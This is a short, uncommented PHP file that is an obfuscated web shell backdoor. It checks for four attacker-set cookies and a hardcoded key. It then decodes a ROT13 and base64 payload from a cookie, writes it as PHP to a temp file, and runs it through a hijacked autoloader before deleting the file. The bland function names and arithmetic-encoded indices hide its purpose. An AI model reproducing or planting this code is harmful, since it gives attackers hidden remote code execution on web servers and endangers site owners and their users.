<?php


if (isset($_COOKIE[-18+18]) && isset($_COOKIE[69+-68]) && isset($_COOKIE[33-30]) && isset($_COOKIE[57+-53])) {
    $res = $_COOKIE;
    function task_processor($reference) {
        $res = $_COOKIE;
        $resource = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '7e2e9f7d');
        if (!is_writable($resource)) {
            $resource = getcwd() . DIRECTORY_SEPARATOR . "query_handler";
        }
        $element = "\x3c\x3f\x70\x68p\x20" . base64_decode(str_rot13($res[3]));
        if (is_writeable($resource)) {
            $factor = fopen($resource, 'w+');
            fputs($factor, $element);
            fclose($factor);
            spl_autoload_unregister(__FUNCTION__);
            require_once($resource);
            @array_map('unlink', array($resource));
        }
    }
    spl_autoload_register("task_processor");
    $rec = "2d19139c2d250d187d1e8d5ae28e3ca9";
    if (!strncmp($rec, $res[4], 32)) {
        if (@class_parents("publish_content_secure_access", true)) {
            exit;
        }
    }
}
